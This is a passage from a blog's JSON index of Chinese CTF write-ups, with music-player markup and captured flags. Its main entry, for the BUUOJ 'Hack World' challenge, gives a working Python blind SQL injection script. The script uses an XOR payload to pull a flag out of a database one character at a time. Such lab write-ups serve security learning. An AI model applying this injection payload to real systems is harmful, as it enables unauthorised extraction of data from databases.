id=\"aplayer-BWCRIfZk\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"789417\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\n<p>flag{d9d1cc00-1b71-4b22-bd07-0137edb623a1}</p>\n","categories":["Writeups"]},{"title":"BUUOJ刷题-Web-Hack-World","url":"/2020/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-Hack-World/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>很明显，select flag from flag，然后过滤了一堆东西，发现没有过滤^，异或注入。 <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://e9104091-792d-476b-8ba6-d151cc2204fe.node3.buuoj.cn/index.php&quot;</span></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">17</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        x=requests.post(url,data=&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;id&quot;</span>:<span class=\"string\">&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;</span>.format(a,b)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        print(<span class=\"string\">&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;</span>.format(a,b))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello, glzjin wants a girlfriend.&quot;</span> <span class=\"keyword\">in</span> x.text:</span><br><span class=\"line\">            flag+=chr(b)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\n\n    <div id=\"aplayer-LhsjcqYi\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"33004351\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\n<p>flag{2af40d57-a06b-4621-aef6-6b4ef6a5be7c}</p>\n","categories":["Writeups"],"tags":["PHP","Web","SQL注入"]},{"title":"Confidence-Final-2020-Haha-jail","url":"/2020/09/13/Confidence-Final-2020-Haha-jail/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>来一道不是BUUOJ上的题，Confidence CTF Final 2020的Haha_jail。</p>\n<p>这题有点麻烦，没法做Docker环境（还是我太菜，麻烦有成功的师傅贡献一下Docker镜像）</p>\n<p>这题给了两个文件，</p>\n\n    <div id=\"aplayer-ILGaFeII\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"1353187370\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\n<p>flag{0980700f-0a4d-45be-a1b2-ec02e8f1a6e4}</p>\n","categories":["Writeups"],"tags":["PHP","Web","Hack","RCE"]}]